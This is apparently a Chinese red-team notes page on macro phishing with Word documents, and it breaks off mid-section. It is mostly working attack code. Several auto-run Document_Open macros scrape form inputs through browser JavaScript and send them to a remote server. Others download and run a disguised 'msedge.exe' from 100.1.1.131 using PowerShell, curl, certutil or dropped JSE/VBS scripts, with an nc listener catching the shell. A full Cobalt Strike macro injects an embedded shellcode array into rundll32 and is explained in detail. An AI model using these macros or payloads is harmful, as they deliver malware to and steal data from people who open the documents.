# VBA宏

> [【钓鱼从入门到放弃】-Docx远程模版加载宏代码 (atsud0.me)](https://atsud0.me/2022/01/【钓鱼从入门到放弃】-Docx远程模版加载宏代码/)

- [渗透测试-地基钓鱼篇-Word文档注入执行恶意宏（二十四）_渗透测试中,office宏执行方法利用-CSDN博客](https://blog.csdn.net/qq_34801745/article/details/111307768)

---

- [VBA宏](#vba宏)
  - [概述](#概述)
    - [VBA宏的结构](#vba宏的结构)
  - [执行 JavaScript](#执行-javascript)
  - [调用 PowerShell 使用 curl 下载与执行恶意程序](#调用-powershell-使用-curl-下载与执行恶意程序)
  - [调用 CMD 执行命令](#调用-cmd-执行命令)
    - [调用 CMD 使用 curl 下载与执行恶意程序](#调用-cmd-使用-curl-下载与执行恶意程序)
    - [调用 CMD 使用 Certutil 下载与执行恶意程序](#调用-cmd-使用-certutil-下载与执行恶意程序)
  - [调CScript调JSCript/VBScript](#调cscript调jscriptvbscript)
  - [调WScript调JSCript/VBScript](#调wscript调jscriptvbscript)
  - [CobaltStrike宏钓鱼(DLL注入)](#cobaltstrike宏钓鱼dll注入)
    - [代码解析](#代码解析)
      - [结构体定义](#结构体定义)
      - [函数声明](#函数声明)
  - [VBA宏加载远程XSL(XMLDOM)](#vba宏加载远程xslxmldom)
    - [概念](#概念)
    - [利用方案](#利用方案)
      - [生成 Shellcode(Payload.bin)](#生成-shellcodepayloadbin)
      - [处理 payload.bin](#处理-payloadbin)
      - [生成 xsl 和 macro](#生成-xsl-和-macro)
  - [相关链接](#相关链接)
  - [宏免杀](#宏免杀)
    - [绕过基于进程树的检测](#绕过基于进程树的检测)
      - [连接到 WMI 新建进程](#连接到-wmi-新建进程)
      - [获取 WSH 对象调用 cmd 执行命令](#获取-wsh-对象调用-cmd-执行命令)

---

## 概述

> [详解VBA编程是什么_w3cschool](https://www.w3cschool.cn/excelvba/excelvba-what.html)
>
> [Excel VBA 教程 Excel VBA 简介 - 闪电教程JSRUN](https://jsrun.net/t/GIkKp)

直到 90 年代早期,使应用程序自动化还是充满挑战性的领域.对每个需要自动化的应用程序,人们不得不学习一种不同的自动化语言

例如:可以用EXCEL的宏语言来使EXCEL自动化,使用WORD BASIC使WORD自动化,等等

微软决定让它开发出来的应用程序共享一种通用的自动化语言——–Visual Basic For Application(VBA)

可以认为 VBA 是非常流行的应用程序开发语言VASUAL BASIC 的子集.实际上VBA是”寄生于”VB应用程序的版本.VBA和VB的区别包括如下几个方面:

- VB是设计用于创建标准的应用程序,而VBA是使已有的应用程序(EXCEL等)自动化
- VB具有自己的开发环境,而VBA必须寄生于已有的应用程序
- 要运行 VB 开发的应用程序,用户不必安装 VB,因为 VB 开发出的应用程序是可执行文件(*.EXE),而VBA开发的程序必须依赖于它的”父”应用程序,例如EXCEL.

---

### VBA宏的结构

VBA宏的结构通常包括声明模块、定义子程序（Sub）和函数（Function）、以及在这些子程序和函数中编写实际的代码。

以下是一个简单的VBA宏结构示例：

```vb
' 模块声明
Option Explicit

' 全局变量声明（如果需要）
Dim exampleVariable As Integer

' 子程序
Sub ExampleSub()
    ' 局部变量声明
    Dim localVariable As String
    
    ' 代码逻辑
    localVariable = "Hello, World!"
    ' 显示消息框
    MsgBox localVariable
End Sub

' 函数
Function ExampleFunction(ByVal x As Integer, ByVal y As Integer) As Integer
    ' 代码逻辑
    ExampleFunction = x + y
End Function

```

![image-20240701162530715](http://cdn.ayusummer233.top/DailyNotes/202407011625102.png)

---

## 执行 JavaScript

1. 新建启用宏的 word 文档 `VBA_JS.docm`

2. 在 Word 中编辑宏脚本

3. 在“工程 – Project”窗口中，双击“Microsoft Word 对象”，再双击“ThisDocument”。

4. 此时在右侧代码窗口顶部，会看到两个列表框，单击左侧下拉列表，将其从“（通用）”更改为“Document”，单击右侧下拉列表，从列表中选择“Close”或“Open”以插入 Document_Close()或 Document_Open()过程，或者可直接在代码窗口输入过程名。

5. 在代码框中输入代码，例如获取自动填充的密码并回传数据

```vbscript
Private Sub Document_Open()

Dim oBrowser As Object
Set oBrowser = CreateObject("InternetExplorer.Application")

'打开网页
oBrowser.Visible = True
oBrowser.Navigate "https://xx.xx.xx"

'等待页面加载完成
Do While oBrowser.ReadyState <> 4
    DoEvents
Loop

'执行 JavaScript 获取输入框的信息并通过 get 请求  http://127.0.0.1:8000?data=xxx 传输
oBrowser.Document.parentWindow.execScript "var inputElements = document.querySelectorAll('.el-input__inner');", "JavaScript"
oBrowser.Document.parentWindow.execScript "var data = ''; for (var i = 0; i < inputElements.length; i++) { data += inputElements[i].value + ' '; }", "JavaScript"
oBrowser.Document.parentWindow.execScript "var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://127.0.0.1:8000" & "?data=' + data, true); xhr.send();", "JavaScript"
'关闭浏览器
oBrowser.Quit
Set oBrowser = Nothing

End Sub
```

```vbscript
Private Sub Document_Open()

Dim oBrowser As Object
Set oBrowser = CreateObject("InternetExplorer.Application")
oBrowser.Visible = True
oBrowser.Navigate "http://100.1.1.131:8000"
Do While oBrowser.ReadyState <> 4
    DoEvents
Loop
'执行 JavaScript 获取输入框的信息并通过 get 请求  http://100.1.1.131:8000?data=xxx 传输
oBrowser.Document.parentWindow.execScript "var inputElements = document.querySelectorAll('.el-input__inner');", "JavaScript"
oBrowser.Document.parentWindow.execScript "var data = ''; for (var i = 0; i < inputElements.length; i++) { data += inputElements[i].value + ' '; }", "JavaScript"
oBrowser.Document.parentWindow.execScript "var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://100.1.1.131:8000" & "?data=' + data, true); xhr.send();", "JavaScript"
'关闭浏览器
oBrowser.Quit
Set oBrowser = Nothing

End Sub

```

![image-20240626165022773](http://cdn.ayusummer233.top/DailyNotes/202406261650962.png)

当用户打开这个 word 文档则会调起浏览器执行 JS 收集信息并向远程服务器发送信息

![image-20240626165255860](http://cdn.ayusummer233.top/DailyNotes/202406261652002.png)

> PS: 示例收集数据信息为空

---

## 调用 PowerShell 使用 curl 下载与执行恶意程序

```vb
Private Sub Document_Open()
    Dim command As String
    command = "powershell.exe -Command ""calc.exe"""
    Call Shell(command, vbNormalFocus)
End Sub
```

需要注意的是 `powershell.exe -Command` 后面的命令要用**两层**双引号包裹起来, 一层是Powershell需要的,一层是VBA Call Shell 需要的

![image-20240712145248578](http://cdn.ayusummer233.top/DailyNotes/202407121452738.png)

---

调用 Powershell 使用 Invoke-WebRequest 下载恶意程序然后使用 Start-Process 执行

```vb
Private Sub Document_Open()
    Dim command As String
    command = "powershell.exe -Command ""Invoke-WebRequest -Uri http://100.1.1.131:8000/download/msedge.exe -OutFile msedge.exe; Start-Process msedge.exe"""
    Call Shell(command, vbNormalFocus)
End Sub
```

---

## 调用 CMD 执行命令

### 调用 CMD 使用 curl 下载与执行恶意程序

```vbscript
Private Sub Document_Open()

Call Shell(Environ$("COMSPEC") & " /c powershell.exe curl http://100.1.1.131:8000/download/msedge.exe -o msedge.exe && msedge.exe", vbNormalFocus)

End Sub
```

`Environ$("COMSPEC")`：获取系统环境变量`COMSPEC`的值。`COMSPEC`通常包含命令处理器的路径，例如`cmd.exe`, 可以用 PowerShell 看下

```powershell
Write-Host $env:COMSPEC
```

![image-20240712142736124](http://cdn.ayusummer233.top/DailyNotes/202407121427541.png)

打开该文档机器实现 shell 上线

```bash
nc -lvvp 65521 | while read line; do echo "$(date '+%Y-%m-%d %H:%M:%S') $line";done
```

![image-20240626165505178](http://cdn.ayusummer233.top/DailyNotes/202406261655301.png)

---

### 调用 CMD 使用 Certutil 下载与执行恶意程序

```vbscript
Private Sub Document_Open()
Call Shell(Environ$("COMSPEC") & " /c certutil -urlcache -split -f http://100.1.1.131:8000/download/msedge.exe && msedge.exe", vbNormalFocus)
End Sub
```

![image-20240626165543364](http://cdn.ayusummer233.top/DailyNotes/202406261655545.png)

受害者打开此文档后会下载恶意程序并上线 shell

![image-20240626165556298](http://cdn.ayusummer233.top/DailyNotes/202406261656785.png)

![image-20240626165641767](http://cdn.ayusummer233.top/DailyNotes/202406261656847.png)

---

## 调CScript调JSCript/VBScript

```vbscript
Private Sub Document_Open()

    Open "art.jse" For Output As #1
    Print #1, "var url = 'http://100.1.1.131:8000/download/msedge.exe';var network = new ActiveXObject('WScript.Network');var username = network.UserName;var downloadPath = 'C:\\Users\\' + username + '\\AppData\\Local\\Temp\\msedge.exe';var xmlhttp = new ActiveXObject('MSXML2.XMLHTTP');xmlhttp.open('GET', url, false);xmlhttp.send();var stream = new ActiveXObject('ADODB.Stream');stream.Open();stream.Type = 1;stream.Write(xmlhttp.responseBody);stream.Position = 0;stream.SaveToFile(downloadPath, 2); stream.Close();var shell = new ActiveXObject('WScript.Shell');shell.Run(downloadPath);"
    Close #1
    Shell "cscript.exe art.jse"

End Sub
```

受害者打开该文件会下载并上线 shell

![image-20240626170250843](http://cdn.ayusummer233.top/DailyNotes/202406261702961.png)

---

## 调WScript调JSCript/VBScript

```vbscript
Private Sub Document_Open()

    Open "de.vbs" For Output As #1
    Print #1, "Set xmlHttp = CreateObject(""MSXML2.XMLHTTP"") : Set adodbStream = CreateObject(""ADODB.Stream"") : url = ""http://100.1.1.131:8000/download/msedge.exe"" : username = CreateObject(""WScript.Network"").UserName : savePath = ""C:\\Users\\"" + username + ""\\AppData\\Local\\Temp\\msedge.exe"" : xmlHttp.Open ""GET"", url, False : xmlHttp.Send : If xmlHttp.Status = 200 Then adodbStream.Type = 1 : adodbStream.Open : adodbStream.Write xmlHttp.ResponseBody : adodbStream.SaveToFile savePath, 2 : adodbStream.Close : Set shell = CreateObject(""WScript.Shell"") : shell.Run savePath, 1, False Else WScript.Echo ""下载失败，状态代码："" & xmlHttp.Status End If : Set adodbStream = Nothing : Set xmlHttp = Nothing : Set shell = Nothing"
    Close #1
    Shell "wscript.exe de.vbs"

End Sub
```

受害者打开该文件会下载并上线 shell

![image-20240626170340011](http://cdn.ayusummer233.top/DailyNotes/202406261703093.png)

---

## CobaltStrike宏钓鱼(DLL注入)

![image-20240701113038801](http://cdn.ayusummer233.top/DailyNotes/202407011130434.png)

![image-20240701113217215](http://cdn.ayusummer233.top/DailyNotes/202407011132355.png)

![image-20240701113244190](http://cdn.ayusummer233.top/DailyNotes/202407011132325.png)

```vbscript
Private Type PROCESS_INFORMATION
    hProcess As Long
    hThread As Long
    dwProcessId As Long
    dwThreadId As Long
End Type

Private Type STARTUPINFO
    cb As Long
    lpReserved As String
    lpDesktop As String
    lpTitle As String
    dwX As Long
    dwY As Long
    dwXSize As Long
    dwYSize As Long
    dwXCountChars As Long
    dwYCountChars As Long
    dwFillAttribute As Long
    dwFlags As Long
    wShowWindow As Integer
    cbReserved2 As Integer
    lpReserved2 As Long
    hStdInput As Long
    hStdOutput As Long
    hStdError As Long
End Type

#If VBA7 Then
    Private Declare PtrSafe Function CreateStuff Lib "kernel32" Alias "CreateRemoteThread" (ByVal hProcess As Long, ByVal lpThreadAttributes As Long, ByVal dwStackSize As Long, ByVal lpStartAddress As LongPtr, lpParameter As Long, ByVal dwCreationFlags As Long, lpThreadID As Long) As LongPtr
    Private Declare PtrSafe Function AllocStuff Lib "kernel32" Alias "VirtualAllocEx" (ByVal hProcess As Long, ByVal lpAddr As Long, ByVal lSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
    Private Declare PtrSafe Function WriteStuff Lib "kernel32" Alias "WriteProcessMemory" (ByVal hProcess As Long, ByVal lDest As LongPtr, ByRef Source As Any, ByVal Length As Long, ByVal LengthWrote As LongPtr) As LongPtr
    Private Declare PtrSafe Function RunStuff Lib "kernel32" Alias "CreateProcessA" (ByVal lpApplicationName As String, ByVal lpCommandLine As String, lpProcessAttributes As Any, lpThreadAttributes As Any, ByVal bInheritHandles As Long, ByVal dwCreationFlags As Long, lpEnvironment As Any, ByVal lpCurrentDirectory As String, lpStartupInfo As STARTUPINFO, lpProcessInformation As PROCESS_INFORMATION) As Long
#Else
    Private Declare Function CreateStuff Lib "kernel32" Alias "CreateRemoteThread" (ByVal hProcess As Long, ByVal lpThreadAttributes As Long, ByVal dwStackSize As Long, ByVal lpStartAddress As Long, lpParameter As Long, ByVal dwCreationFlags As Long, lpThreadID As Long) As Long
    Private Declare Function AllocStuff Lib "kernel32" Alias "VirtualAllocEx" (ByVal hProcess As Long, ByVal lpAddr As Long, ByVal lSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As Long
    Private Declare Function WriteStuff Lib "kernel32" Alias "WriteProcessMemory" (ByVal hProcess As Long, ByVal lDest As Long, ByRef Source As Any, ByVal Length As Long, ByVal LengthWrote As Long) As Long
    Private Declare Function RunStuff Lib "kernel32" Alias "CreateProcessA" (ByVal lpApplicationName As String, ByVal lpCommandLine As String, lpProcessAttributes As Any, lpThreadAttributes As Any, ByVal bInheritHandles As Long, ByVal dwCreationFlags As Long, lpEnvironment As Any, ByVal lpCurrentDriectory As String, lpStartupInfo As STARTUPINFO, lpProcessInformation As PROCESS_INFORMATION) As Long
#End If

Sub Auto_Open()
    Dim myByte As Long, myArray As Variant, offset As Long
    Dim pInfo As PROCESS_INFORMATION
    Dim sInfo As STARTUPINFO
    Dim sNull As String
    Dim sProc As String

    #If VBA7 Then
        Dim rwxpage As LongPtr, res As LongPtr
    #Else
        Dim rwxpage As Long, res As Long
    #End If
    myArray = Array(-4,-24,-119,0,0,0,96,-119,-27,49,-46,100,-117,82,48,-117,82,12,-117,82,20,-117,114,40,15,-73,74,38,49,-1,49,-64,-84,60,97,124,2,44,32,-63,-49, _
13,1,-57,-30,-16,82,87,-117,82,16,-117,66,60,1,-48,-117,64,120,-123,-64,116,74,1,-48,80,-117,72,24,-117,88,32,1,-45,-29,60,73,-117,52,-117,1, _
-42,49,-1,49,-64,-84,-63,-49,13,1,-57,56,-32,117,-12,3,125,-8,59,125,36,117,-30,88,-117,88,36,1,-45,102,-117,12,75,-117,88,28,1,-45,-117,4, _
-117,1,-48,-119,68,36,36,91,91,97,89,90,81,-1,-32,88,95,90,-117,18,-21,-122,93,104,110,101,116,0,104,119,105,110,105,84,104,76,119,38,7,-1, _
-43,49,-1,87,87,87,87,87,104,58,86,121,-89,-1,-43,-23,-124,0,0,0,91,49,-55,81,81,106,3,81,81,104,80,0,0,0,83,80,104,87,-119,-97, _
-58,-1,-43,-21,112,91,49,-46,82,104,0,2,64,-124,82,82,82,83,82,80,104,-21,85,46,59,-1,-43,-119,-58,-125,-61,80,49,-1,87,87,106,-1,83,86, _
104,45,6,24,123,-1,-43,-123,-64,15,-124,-61,1,0,0,49,-1,-123,-10,116,4,-119,-7,-21,9,104,-86,-59,-30,93,-1,-43,-119,-63,104,69,33,94,49,-1, _
-43,49,-1,87,106,7,81,86,80,104,-73,87,-32,11,-1,-43,-65,0,47,0,0,57,-57,116,-73,49,-1,-23,-111,1,0,0,-23,-55,1,0,0,-24,-117,-1, _
-1,-1,47,104,55,113,76,0,-64,-89,-9,-97,-35,-61,-2,67,-43,-76,-7,-112,84,-36,22,-7,16,53,19,-31,10,-80,108,-37,-14,26,-10,113,40,56,-114,-98, _
92,-39,-88,-5,79,-69,-88,-9,27,40,-87,7,111,29,13,2,76,-49,-60,-4,-47,-74,-64,20,-27,-74,-112,45,-88,-61,-3,103,-19,11,-121,23,69,65,106,-75, _
87,0,85,115,101,114,45,65,103,101,110,116,58,32,77,111,122,105,108,108,97,47,52,46,48,32,40,99,111,109,112,97,116,105,98,108,101,59,32,77, _
83,73,69,32,56,46,48,59,32,87,105,110,100,111,119,115,32,78,84,32,53,46,49,59,32,84,114,105,100,101,110,116,47,52,46,48,59,32,81,81, _
68,111,119,110,108,111,97,100,32,55,51,51,59,32,73,110,102,111,80,97,116,104,46,50,41,13,10,0,-111,-101,90,56,32,-115,-23,-46,-92,90,98,26, _
93,-84,-29,-103,28,86,81,-101,-43,88,-56,-37,-28,-52,75,-99,60,-123,-63,-92,109,23,-13,71,32,124,-3,-51,72,6,28,32,21,23,100,-38,9,121,99,114, _
-26,54,-2,84,45,-95,-32,90,-108,20,-74,50,66,116,-113,-28,-31,49,-55,-23,-81,120,53,32,-127,31,8,23,20,-80,20,-50,-122,113,-19,5,67,-35,72,-38, _
108,-128,-52,-46,30,-35,49,78,-62,20,-63,-124,-116,-41,-100,-95,-49,117,82,83,49,-77,35,103,6,-122,77,-57,106,-33,-46,36,-76,4,-30,-23,18,119,54,-121, _
-54,119,0,-81,-125,-46,87,32,-110,-33,-103,52,-71,-116,-15,25,101,-37,108,51,15,88,-6,-33,68,-119,-97,-8,-24,7,6,-30,-128,1,102,-9,-41,33,34,59, _
12,-124,78,3,-105,-100,-84,-105,-52,88,12,113,124,-116,69,82,-66,-124,63,96,-36,38,69,14,-111,0,104,-16,-75,-94,86,-1,-43,106,64,104,0,16,0,0, _
104,0,0,64,0,87,104,88,-92,83,-27,-1,-43,-109,-71,0,0,0,0,1,-39,81,83,-119,-25,87,104,0,32,0,0,83,86,104,18,-106,-119,-30,-1,-43, _
-123,-64,116,-58,-117,7,1,-61,-123,-64,117,-27,88,-61,-24,-87,-3,-1,-1,49,48,48,46,49,46,49,46,49,51,49,0,0,1,-122,-96)
    If Len(Environ("ProgramW6432")) > 0 Then
        sProc = Environ("windir") & "\\SysWOW64\\rundll32.exe"
    Else
        sProc = Environ("windir") & "\\System32\\rundll32.exe"
    End If

    res = RunStuff(sNull, sProc, ByVal 0&, ByVal 0&, ByVal 1&, ByVal 4&, ByVal 0&, sNull, sInfo, pInfo)

    rwxpage = AllocStuff(pInfo.hProcess, 0, UBound(myArray), &H1000, &H40)
    For offset = LBound(myArray) To UBound(myArray)
        myByte = myArray(offset)
        res = WriteStuff(pInfo.hProcess, rwxpage + offset, myByte, 1, ByVal 0&)
    Next offset
    res = CreateStuff(pInfo.hProcess, 0, 0, rwxpage, 0, 0, 0)
End Sub
Sub AutoOpen()
    Auto_Open
End Sub
Sub Workbook_Open()
    Auto_Open
End Sub

```

![image-20240701162942046](http://cdn.ayusummer233.top/DailyNotes/202407011629222.png)

---

### 代码解析

直接捋主逻辑

```vb
Sub AutoOpen()
    Auto_Open
End Sub

Sub Workbook_Open()
    Auto_Open
End Sub
```

指示在文档打开时自动调用 `Sub Auto_Open` 的代码

```vb
Sub Auto_Open()
    Dim myByte As Long, myArray As Variant, offset As Long
    Dim pInfo As PROCESS_INFORMATION
    Dim sInfo As STARTUPINFO
    Dim sNull As String
    Dim sProc As String

    #If VBA7 Then
        Dim rwxpage As LongPtr, res As LongPtr
    #Else
        Dim rwxpage As Long, res As Long
    #End If
    myArray = Array(-4,-24,-119,0,0,0,96,-119,-27,49,-46,100,-117,82,48,-117,82,12,-117,82,20,-117,114,40,15,-73,74,38,49,-1,49,-64,-84,60,97,124,2,44,32,-63,-49, _
13,1,-57,-30,-16,82,87,-117,82,16,-117,66,60,1,-48,-117,64,120,-123,-64,116,74,1,-48,80,-117,72,24,-117,88,32,1,-45,-29,60,73,-117,52,-117,1, _
-42,49,-1,49,-64,-84,-63,-49,13,1,-57,56,-32,117,-12,3,125,-8,59,125,36,117,-30,88,-117,88,36,1,-45,102,-117,12,75,-117,88,28,1,-45,-117,4, _
-117,1,-48,-119,68,36,36,91,91,97,89,90,81,-1,-32,88,95,90,-117,18,-21,-122,93,104,110,101,116,0,104,119,105,110,105,84,104,76,119,38,7,-1, _
-43,49,-1,87,87,87,87,87,104,58,86,121,-89,-1,-43,-23,-124,0,0,0,91,49,-55,81,81,106,3,81,81,104,80,0,0,0,83,80,104,87,-119,-97, _
-58,-1,-43,-21,112,91,49,-46,82,104,0,2,64,-124,82,82,82,83,82,80,104,-21,85,46,59,-1,-43,-119,-58,-125,-61,80,49,-1,87,87,106,-1,83,86, _
104,45,6,24,123,-1,-43,-123,-64,15,-124,-61,1,0,0,49,-1,-123,-10,116,4,-119,-7,-21,9,104,-86,-59,-30,93,-1,-43,-119,-63,104,69,33,94,49,-1, _
-43,49,-1,87,106,7,81,86,80,104,-73,87,-32,11,-1,-43,-65,0,47,0,0,57,-57,116,-73,49,-1,-23,-111,1,0,0,-23,-55,1,0,0,-24,-117,-1, _
-1,-1,47,104,55,113,76,0,-64,-89,-9,-97,-35,-61,-2,67,-43,-76,-7,-112,84,-36,22,-7,16,53,19,-31,10,-80,108,-37,-14,26,-10,113,40,56,-114,-98, _
92,-39,-88,-5,79,-69,-88,-9,27,40,-87,7,111,29,13,2,76,-49,-60,-4,-47,-74,-64,20,-27,-74,-112,45,-88,-61,-3,103,-19,11,-121,23,69,65,106,-75, _
87,0,85,115,101,114,45,65,103,101,110,116,58,32,77,111,122,105,108,108,97,47,52,46,48,32,40,99,111,109,112,97,116,105,98,108,101,59,32,77, _
83,73,69,32,56,46,48,59,32,87,105,110,100,111,119,115,32,78,84,32,53,46,49,59,32,84,114,105,100,101,110,116,47,52,46,48,59,32,81,81, _
68,111,119,110,108,111,97,100,32,55,51,51,59,32,73,110,102,111,80,97,116,104,46,50,41,13,10,0,-111,-101,90,56,32,-115,-23,-46,-92,90,98,26, _
93,-84,-29,-103,28,86,81,-101,-43,88,-56,-37,-28,-52,75,-99,60,-123,-63,-92,109,23,-13,71,32,124,-3,-51,72,6,28,32,21,23,100,-38,9,121,99,114, _
-26,54,-2,84,45,-95,-32,90,-108,20,-74,50,66,116,-113,-28,-31,49,-55,-23,-81,120,53,32,-127,31,8,23,20,-80,20,-50,-122,113,-19,5,67,-35,72,-38, _
108,-128,-52,-46,30,-35,49,78,-62,20,-63,-124,-116,-41,-100,-95,-49,117,82,83,49,-77,35,103,6,-122,77,-57,106,-33,-46,36,-76,4,-30,-23,18,119,54,-121, _
-54,119,0,-81,-125,-46,87,32,-110,-33,-103,52,-71,-116,-15,25,101,-37,108,51,15,88,-6,-33,68,-119,-97,-8,-24,7,6,-30,-128,1,102,-9,-41,33,34,59, _
12,-124,78,3,-105,-100,-84,-105,-52,88,12,113,124,-116,69,82,-66,-124,63,96,-36,38,69,14,-111,0,104,-16,-75,-94,86,-1,-43,106,64,104,0,16,0,0, _
104,0,0,64,0,87,104,88,-92,83,-27,-1,-43,-109,-71,0,0,0,0,1,-39,81,83,-119,-25,87,104,0,32,0,0,83,86,104,18,-106,-119,-30,-1,-43, _
-123,-64,116,-58,-117,7,1,-61,-123,-64,117,-27,88,-61,-24,-87,-3,-1,-1,49,48,48,46,49,46,49,46,49,51,49,0,0,1,-122,-96)
    If Len(Environ("ProgramW6432")) > 0 Then
        sProc = Environ("windir") & "\\SysWOW64\\rundll32.exe"
    Else
        sProc = Environ("windir") & "\\System32\\rundll32.exe"
    End If

    res = RunStuff(sNull, sProc, ByVal 0&, ByVal 0&, ByVal 1&, ByVal 4&, ByVal 0&, sNull, sInfo, pInfo)

    rwxpage = AllocStuff(pInfo.hProcess, 0, UBound(myArray), &H1000, &H40)
    For offset = LBound(myArray) To UBound(myArray)
        myByte = myArray(offset)
        res = WriteStuff(pInfo.hProcess, rwxpage + offset, myByte, 1, ByVal 0&)
    Next offset
    res = CreateStuff(pInfo.hProcess, 0, 0, rwxpage, 0, 0, 0)
End Sub
```

- **宏初始化**：定义了一些变量，包括进程信息和启动信息结构体

  - 在 VB 中，声明的变量会自动初始化为它们的默认值。以下是常见数据类型及其默认值：
    - `Integer`, `Long`, `Single`, `Double`: 默认值为 `0`
    - `Boolean`: 默认值为 `False`
    - `String`: 默认值为空字符串 `""`
    - `Object`: 默认值为 `Nothing`（相当于 `null`）

- **选择运行的可执行文件**：根据系统环境变量，选择`rundll32.exe`的路径

  - `Len(Environ("ProgramW6432"))`

    `Environ` 是一个函数，用于获取环境变量的值, 64 位系统有这个环境变量, 32位系统没有, 因此可以根据这个变量的长度来判断系统为 64 位还是 32 位从而指定 `rundll32.exe` 的路径

    `Environ("ProgramW6432")` 返回一个字符串，表示系统环境变量 `ProgramW6432` 的值。

    通常，这个环境变量的值是 64 位系统上的程序文件夹路径，如 `C:\Program Files`。

    > 可以用 Powershell `Write-Host $env:ProgramW6432` 看下
    >
    > ![image-20240701173317039](http://cdn.ayusummer233.top/DailyNotes/202407011733315.png)

- **创建进程**：使用`CreateProcessA`函数启动`rundll32.exe`

  > [CreateProcessA function (processthreadsapi.h) - Win32 apps | Microsoft Learn](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa)
  > 创建一个新进程及其主线程。新进程在调用进程的安全上下文中运行。
  >
  > ```c++
  > BOOL CreateProcessA(
  >   [in, optional]      LPCSTR                lpApplicationName,
  >   [in, out, optional] LPSTR                 lpCommandLine,
  >   [in, optional]      LPSECURITY_ATTRIBUTES lpProcessAttributes,
  >   [in, optional]      LPSECURITY_ATTRIBUTES lpThreadAttributes,
  >   [in]                BOOL                  bInheritHandles,
  >   [in]                DWORD                 dwCreationFlags,
  >   [in, optional]      LPVOID                lpEnvironment,
  >   [in, optional]      LPCSTR                lpCurrentDirectory,
  >   [in]                LPSTARTUPINFOA        lpStartupInfo,
  >   [out]               LPPROCESS_INFORMATION lpProcessInformation
  > );
  > ```

  `res = RunStuff(sNull, sProc, ByVal 0&, ByVal 0&, ByVal 1&, ByVal 4&, ByVal 0&, sNull, sInfo, pInfo)`

  - `RunStuff`

    ```vb
    Private Declare Function RunStuff Lib "kernel32" Alias "CreateProcessA" (
        ByVal lpApplicationName As String, 
        ByVal lpCommandLine As String, 
        lpProcessAttributes As Any, 
        lpThreadAttributes As Any, 
        ByVal bInheritHandles As Long, 
        ByVal dwCreationFlags As Long, 
        lpEnvironment As Any, 
        ByVal lpCurrentDriectory As String, 
        lpStartupInfo As STARTUPINFO, 
        lpProcessInformation As PROCESS_INFORMATION
    ) As Long
    ```

    - `Lib "kernel32" Alias "CreateRemoteThread"`

      - `Lib "kernel32"`：指定函数位于`kernel32.dll`库中，这是Windows操作系统的一个核心库
      - `Alias "CreateRemoteThread"`：指明VBA中的`CreateStuff`函数实际调用的是`CreateRemoteThread`函数

    - `ByVal(By Value)`: 传值; `ByRef(By Reference)`: 传引用; 如果没有标识是传值(ByVal) 还是传引用(ByRef) 的话默认是传引用(ByRef)

    - 功能: 创建一个新进程及其主线程

    - 参数

      - `lpApplicationName`：可执行模块的名称。这个字符串可以是模块名称，也可以是完整路径名。

        如果为空，函数从 `lpCommandLine` 参数中解析可执行模块的名称

        > 这里传入的是空

      - `lpCommandLine`：要执行的命令行

        如果 `lpApplicationName` 参数为空，这个字符串必须包含模块名称

        如果不为空，字符串可以是空格分隔的模块名称和参数

        > 这里传入的是 `C:\Program Files\\SysWOW64\\rundll32.exe`

      - `lpProcessAttributes`：指向一个 `SECURITY_ATTRIBUTES` 结构体，确定返回的新进程对象句柄是否可以由子进程继

      - 承。如果lpProcessAttributes为NULL，则句柄不能被继承。

        > 这里传入为空, 表示句柄不能被继承; 进程获得默认安全描述符; 进程的默认安全描述符中的 ACL 来自创建者的主令牌。

      - `lpThreadAttributes`：指向 `SECURITY_ATTRIBUTES` 结构的指针，该结构确定返回的新线程对象句柄是否可以由子进程继承。如果lpThreadAttributes为NULL，则句柄不能被继承。

        该结构的 `lpSecurityDescriptor` 成员指定主线程的安全描述符。

        如果 `lpThreadAttributes` 为 NULL 或 `lpSecurityDescriptor` 为 NULL，则线程获得默认安全描述符。线程的默认安全描述符中的 ACL 来自进程令牌。

        Windows XP：线程的默认安全描述符中的 ACL 来自创建者的主令牌或模拟令牌。 Windows XP SP2 和 Windows Server 2003 中的这种行为发生了变化。

        > 这里传入为空
    
      - `bInheritHandles`：
    
        - 如果此参数为 TRUE，则调用进程中的每个可继承句柄都将由新进程继承。
        - 如果参数为 FALSE，则不会继承句柄。
    
        请注意，继承的句柄与原始句柄具有相同的值和访问权限。
    
        > 这里传入为 `1&` TRUE
    
      - `dwCreationFlags`：控制优先级类别和进程创建的标志（例如，`CREATE_NEW_CONSOLE`）。
    
        > [Process Creation Flags (WinBase.h) - Win32 apps | Microsoft Learn](https://learn.microsoft.com/en-us/windows/win32/procthread/process-creation-flags) 
    
        该参数还控制新进程的优先级类别，用于确定进程线程的调度优先级。
    
        如果未指定任何优先级类别标志，则优先级类别默认为 `NORMAL_PRIORITY_CLASS`，除非创建进程的优先级类别为 `IDLE_PRIORITY_CLASS` 或 `BELOW_NORMAL_PRIORITY_CLASS`。在这种情况下，子进程接收调用进程的默认优先级。
    
        > 这里传入为 `4&`, 表示 `CREATE_SUSPENDED`, 新进程的主线程在挂起状态下创建，直到调用 `ResumeThread` 函数后才运行。
        >
        > ![image-20240703162254138](http://cdn.ayusummer233.top/DailyNotes/202407031622100.png)
    
      - `lpEnvironment`：指向新进程的环境块的指针。
    
        如果该参数为NULL，则新进程使用调用进程的环境。
    
        > 这里传入为 `0&`, NULL
    
      - `lpCurrentDriectory`：新进程的当前目录, 该字符串还可以指定 UNC 路径
    
        如果此参数为 NULL，则新进程将与调用进程具有相同的当前驱动器和目录。 （此功能主要为需要启动应用程序并指定其初始驱动器和工作目录的 shell 提供。）
    
        > 这里传入为 `sNull`, NULL
    
      - `lpStartupInfo`：一个`STARTUPINFO`结构体，包含新进程的主窗口属性。
    
        指向 STARTUPINFO 或 STARTUPINFOEX 结构的指针。
    
        > 这里传入为 `sInfo`, 是使用默认值初始化的 `STARTUPINFO`
    
      - `lpProcessInformation`：指向 PROCESS_INFORMATION 结构的指针，该结构接收有关新进程的标识信息
    
        当不再需要 PROCESS_INFORMATION 中的句柄时，必须使用 CloseHandle 将其关闭。
        
        > 这里传入为 `pInfo`, 是使用默认值初始化的 `PROCESS_INFORMATION`
    
    - **返回值**：返回非零表示成功，`0`表示失败。
    
      > 请注意，该函数在进程完成初始化之前返回。如果无法找到所需的 DLL 或无法初始化，则进程将终止。要获取进程的终止状态，请调用 GetExitCodeProcess。

- **分配内存**：在新进程中分配可读写执行的内存页。

  ```vb
